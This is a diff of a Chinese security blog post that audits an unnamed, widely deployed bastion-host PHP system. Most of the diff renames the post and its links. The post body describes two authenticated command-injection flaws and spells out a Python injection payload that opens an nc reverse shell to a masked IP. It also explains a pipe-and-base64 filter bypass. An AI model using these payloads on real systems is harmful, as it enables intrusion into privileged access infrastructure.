@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hello, World" />
+  <meta name="keywords" content="审计 PHP," />
 
 
 
@@ -79,25 +79,26 @@
 
 
 
-<meta name="description" content="前言接上篇blog解密php，该堡垒机系统听说是处于领导地位的堡垒机系统，很多大厂也在使用，并且传说该系统没有安全漏洞，但是经过仔细的审计还是发现了bypass过滤的方法来达成后台getshell。 结构 12345678910111213141516#index.php片段&amp;lt;?@session_start();$sid = session_id();@session_destroy();$">
+<meta name="description" content="前言接上篇blog解密php，该堡垒机系统听说是处于领导地位的堡垒机系统，很多大厂也在使用，并且传说该系统没有安全漏洞，但是经过挖掘还是发现了后台getshell。 结构 12345678910111213141516#index.php片段&amp;lt;?@session_start();$sid = session_id();@session_destroy();$CONFIG[&quot;img&quot;] = t">
+<meta name="keywords" content="审计 PHP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="对某老牌堡垒机系统的从解密到审计">
-<meta property="og:url" content="https://jrdw0.github.io/2019/06/03/对某老牌堡垒机系统的从解密到审计/index.html">
+<meta property="og:title" content="对某老牌堡垒机系统的从解密到getshell">
+<meta property="og:url" content="https://jrdw0.github.io/2019/06/03/对某老牌堡垒机系统的从解密到getshell/index.html">
 <meta property="og:site_name" content="JrD&#39;s blog">
-<meta property="og:description" content="前言接上篇blog解密php，该堡垒机系统听说是处于领导地位的堡垒机系统，很多大厂也在使用，并且传说该系统没有安全漏洞，但是经过仔细的审计还是发现了bypass过滤的方法来达成后台getshell。 结构 12345678910111213141516#index.php片段&amp;lt;?@session_start();$sid = session_id();@session_destroy();$">
+<meta property="og:description" content="前言接上篇blog解密php，该堡垒机系统听说是处于领导地位的堡垒机系统，很多大厂也在使用，并且传说该系统没有安全漏洞，但是经过挖掘还是发现了后台getshell。 结构 12345678910111213141516#index.php片段&amp;lt;?@session_start();$sid = session_id();@session_destroy();$CONFIG[&quot;img&quot;] = t">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://jrdw0.github.io/2019/06/03/对某老牌堡垒机系统的从解密到审计/directory.png">
-<meta property="og:image" content="https://jrdw0.github.io/2019/06/03/对某老牌堡垒机系统的从解密到审计/burp1.png">
-<meta property="og:image" content="https://jrdw0.github.io/2019/06/03/对某老牌堡垒机系统的从解密到审计/result1.png">
-<meta property="og:image" content="https://jrdw0.github.io/2019/06/03/对某老牌堡垒机系统的从解密到审计/管道.png">
-<meta property="og:image" content="https://jrdw0.github.io/2019/06/03/对某老牌堡垒机系统的从解密到审计/base64.png">
-<meta property="og:image" content="https://jrdw0.github.io/2019/06/03/对某老牌堡垒机系统的从解密到审计/burp2.png">
-<meta property="og:image" content="https://jrdw0.github.io/2019/06/03/对某老牌堡垒机系统的从解密到审计/result2.png">
-<meta property="og:updated_time" content="2019-06-04T11:04:50.542Z">
+<meta property="og:image" content="https://jrdw0.github.io/2019/06/03/对某老牌堡垒机系统的从解密到getshell/directory.png">
+<meta property="og:image" content="https://jrdw0.github.io/2019/06/03/对某老牌堡垒机系统的从解密到getshell/burp1.png">
+<meta property="og:image" content="https://jrdw0.github.io/2019/06/03/对某老牌堡垒机系统的从解密到getshell/result1.png">
+<meta property="og:image" content="https://jrdw0.github.io/2019/06/03/对某老牌堡垒机系统的从解密到getshell/管道.png">
+<meta property="og:image" content="https://jrdw0.github.io/2019/06/03/对某老牌堡垒机系统的从解密到getshell/base64.png">
+<meta property="og:image" content="https://jrdw0.github.io/2019/06/03/对某老牌堡垒机系统的从解密到getshell/burp2.png">
+<meta property="og:image" content="https://jrdw0.github.io/2019/06/03/对某老牌堡垒机系统的从解密到getshell/result2.png">
+<meta property="og:updated_time" content="2019-06-04T11:12:59.116Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="对某老牌堡垒机系统的从解密到审计">
-<meta name="twitter:description" content="前言接上篇blog解密php，该堡垒机系统听说是处于领导地位的堡垒机系统，很多大厂也在使用，并且传说该系统没有安全漏洞，但是经过仔细的审计还是发现了bypass过滤的方法来达成后台getshell。 结构 12345678910111213141516#index.php片段&amp;lt;?@session_start();$sid = session_id();@session_destroy();$">
-<meta name="twitter:image" content="https://jrdw0.github.io/2019/06/03/对某老牌堡垒机系统的从解密到审计/directory.png">
+<meta name="twitter:title" content="对某老牌堡垒机系统的从解密到getshell">
+<meta name="twitter:description" content="前言接上篇blog解密php，该堡垒机系统听说是处于领导地位的堡垒机系统，很多大厂也在使用，并且传说该系统没有安全漏洞，但是经过挖掘还是发现了后台getshell。 结构 12345678910111213141516#index.php片段&amp;lt;?@session_start();$sid = session_id();@session_destroy();$CONFIG[&quot;img&quot;] = t">
+<meta name="twitter:image" content="https://jrdw0.github.io/2019/06/03/对某老牌堡垒机系统的从解密到getshell/directory.png">
 
 
 
@@ -127,13 +128,13 @@
 
 
 
-  <link rel="canonical" href="https://jrdw0.github.io/2019/06/03/对某老牌堡垒机系统的从解密到审计/"/>
+  <link rel="canonical" href="https://jrdw0.github.io/2019/06/03/对某老牌堡垒机系统的从解密到getshell/"/>
 
 
 
 
 
-  <title>对某老牌堡垒机系统的从解密到审计 | JrD's blog</title>
+  <title>对某老牌堡垒机系统的从解密到getshell | JrD's blog</title>
   
 
 
@@ -240,7 +241,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://jrdw0.github.io/2019/06/03/对某老牌堡垒机系统的从解密到审计/">
+    <link itemprop="mainEntityOfPage" href="https://jrdw0.github.io/2019/06/03/对某老牌堡垒机系统的从解密到getshell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="JrD">
@@ -257,7 +258,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">对某老牌堡垒机系统的从解密到审计</h1>
+          <h1 class="post-title" itemprop="name headline">对某老牌堡垒机系统的从解密到getshell</h1>
         
 
         <div class="post-meta">
@@ -287,7 +288,7 @@
 
           
           
-             <span id="/2019/06/03/对某老牌堡垒机系统的从解密到审计/" class="leancloud_visitors" data-flag-title="对某老牌堡垒机系统的从解密到审计">
+             <span id="/2019/06/03/对某老牌堡垒机系统的从解密到getshell/" class="leancloud_visitors" data-flag-title="对某老牌堡垒机系统的从解密到getshell">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -318,8 +319,8 @@
       
 
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>接上篇blog解密php，该堡垒机系统听说是处于领导地位的堡垒机系统，很多大厂也在使用，并且传说该系统没有安全漏洞，但是经过仔细的审计还是发现了bypass过滤的方法来达成后台getshell。</p>
-<h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p><img src="/2019/06/03/对某老牌堡垒机系统的从解密到审计/directory.png" alt="noname"></p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>接上篇blog解密php，该堡垒机系统听说是处于领导地位的堡垒机系统，很多大厂也在使用，并且传说该系统没有安全漏洞，但是经过挖掘还是发现了后台getshell。</p>
+<h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p><img src="/2019/06/03/对某老牌堡垒机系统的从解密到getshell/directory.png" alt="noname"></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.php片段</span></span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">@session_start();</span><br><span class="line">$sid = session_id();</span><br><span class="line">@session_destroy();</span><br><span class="line">$CONFIG[<span class="string">"img"</span>] = <span class="keyword">true</span>;</span><br><span class="line">$CONFIG[<span class="string">"nomaster"</span>] = <span class="keyword">true</span>;</span><br><span class="line">$CONFIG[<span class="string">"not_http_referer"</span>] = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"include/common.php"</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"include/Validate.php"</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">'include/integrity.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"include/common.php"</span>);</span><br><span class="line"></span><br><span class="line">check_perm(<span class="string">"admin"</span>);</span><br></pre></td></tr></table></figure>
 <p>我们可以看到从上图看出该系统因为历史悠久，在架构上还是使用静态php文件的路由方式，并没有使用MVC的结构，整体的系统架构略显臃肿。</p>
 <p>从头部引入可以发现，该系统是采用定义<code>$CONFIG</code>数组定义一些环境变量并包含<code>common.php</code>等文件的设置，利用check_perm方法做权限的限制与鉴定。其中具体结构的实现细节与本文无关，就不多聊结构问题。</p>
@@ -331,12 +332,12 @@
 <p>其中<code>import_request_variables()</code>方法是一个在5.4.0以后就废弃的方法，在5.4.0以后一般推荐<code>extract()</code>来代替，作用<strong>是 将 GET／POST／Cookie 变量导入到全局作用域中</strong>。上面这句话是官方中文的解释，通俗点说，就是如果传入了一个”password”变量，那么php会得到一个”$req_password”的全局变量。其他的代码作用我尽量详细的写在注释里面了，方便理解。总之开发者应当是想定义一个接受安全传参的数组，若参数在这个数组内则放行，不在参数内则进行过滤。</p>
 <p>那我们找找看有没有在数组内的执行，被我找到了一个在数组内的参数<code>crypt_passwd</code>，所以发现了第一个后台getshell漏洞代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$code = <span class="keyword">array</span>(<span class="string">"#-*- coding: utf-8 -*-"</span>);</span><br><span class="line">$code[] = <span class="string">"from shterm.crypt import zip_cipher"</span>;</span><br><span class="line">$code[] = <span class="string">"print zip_cipher.encrypt('$req_crypt_passwd')"</span>;</span><br><span class="line"><span class="keyword">list</span>($result, $secret, $stderr) = python_exec($code);</span><br></pre></td></tr></table></figure></p>
 <p>根据上文可以知道<code>$req_pgp_pubkey</code>就是接收到的<code>pgp_pubkey</code>参数，而<code>pgp_pubkey</code>参数并不在<code>$safe_req</code>的定义里，这是一个漏网之鱼所以可以比较简单的构造一个python的反弹shell，payload如下<code>123&#39;);import os;os.popen(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc xxx.xxx.xxx.xxx 12345 &gt;/tmp/f&#39;)#</code>这里利用了一个python其实并不是一定要换行，也可以使用<code>;</code>来做换行的小trick。结果如图：</p>
-<p><img src="/2019/06/03/对某老牌堡垒机系统的从解密到审计/burp1.png" alt="noname"><br><img src="/2019/06/03/对某老牌堡垒机系统的从解密到审计/result1.png" alt="noname"></p>
-<h2 id="绕过过滤的getshell"><a href="#绕过过滤的getshell" class="headerlink" title="绕过过滤的getshell"></a>绕过过滤的getshell</h2><p>在一个文件里审计到了如下的代码段：</p>
+<p><img src="/2019/06/03/对某老牌堡垒机系统的从解密到getshell/burp1.png" alt="noname"><br><img src="/2019/06/03/对某老牌堡垒机系统的从解密到getshell/result1.png" alt="noname"></p>
+<h2 id="绕过过滤的getshell"><a href="#绕过过滤的getshell" class="headerlink" title="绕过过滤的getshell"></a>绕过过滤的getshell</h2><p>在一个文件里挖掘到了如下的代码段：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$type = $req_type;</span><br><span class="line">$action = $req_action;</span><br><span class="line"></span><br><span class="line">$output = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($type == <span class="string">"mode"</span>) &#123;</span><br><span class="line">	exec(<span class="string">"sudo /usr/libexec/shterm/clusterctl drsync-mode $action"</span>, $output, $r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>根据之前分析的我们知道<code>$req_type</code>和<code>$req_action</code>就是接受了<code>type</code>和<code>action</code>的传参并且这两个参数都不在<code>safe_req</code>的数组里所以都被过滤了，<code>#[&lt;&gt;\&#39;&quot;\\/&amp;*;]#</code>这些特殊字符都不能传参。但是我发现特殊字符的过滤忽略了<code>|</code>和<code>-</code>符号，而<code>|</code>跟<code>-</code>符号其实是可以通过管道符号和编码绕过过滤和之前的语句，执行自己想要执行的payload甚至反弹shell的。</p>
-<p><code>|</code>管道符号的特性：<br><img src="/2019/06/03/对某老牌堡垒机系统的从解密到审计/管道.png" alt="noname"></p>
-<p>综上所述我利用base64编码构造了一个绕过过滤的payload：<br><img src="/2019/06/03/对某老牌堡垒机系统的从解密到审计/base64.png" alt="noname"><br>之后发包成功执行反弹shell：<br><img src="/2019/06/03/对某老牌堡垒机系统的从解密到审计/burp2.png" alt="noname"><br><img src="/2019/06/03/对某老牌堡垒机系统的从解密到审计/result2.png" alt="noname"></p>
+<p><code>|</code>管道符号的特性：<br><img src="/2019/06/03/对某老牌堡垒机系统的从解密到getshell/管道.png" alt="noname"></p>
+<p>综上所述我利用base64编码构造了一个绕过过滤的payload：<br><img src="/2019/06/03/对某老牌堡垒机系统的从解密到getshell/base64.png" alt="noname"><br>之后发包成功执行反弹shell：<br><img src="/2019/06/03/对某老牌堡垒机系统的从解密到getshell/burp2.png" alt="noname"><br><img src="/2019/06/03/对某老牌堡垒机系统的从解密到getshell/result2.png" alt="noname"></p>
 
       
     </div>
@@ -352,6 +353,12 @@
 
     <footer class="post-footer">
       
+        <div class="post-tags">
+          
+            <a href="/tags/审计-PHP/" rel="tag"># 审计 PHP</a>
+          
+        </div>
+      
 
       
       
@@ -361,8 +368,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/06/03/对某老牌堡垒机系统的从解密到getshell/" rel="next" title="对某老牌堡垒机系统的从解密到getshell">
-                <i class="fa fa-chevron-left"></i> 对某老牌堡垒机系统的从解密到getshell
+              <a href="/2019/03/14/PHP-SCREW解密PM9SCREW/" rel="next" title="PHP_SCREW解密PM9SCREW">
+                <i class="fa fa-chevron-left"></i> PHP_SCREW解密PM9SCREW
               </a>
             
           </div>
@@ -370,6 +377,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/06/03/对某老牌堡垒机系统的从解密到审计/" rel="prev" title="对某老牌堡垒机系统的从解密到审计">
+                对某老牌堡垒机系统的从解密到审计 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
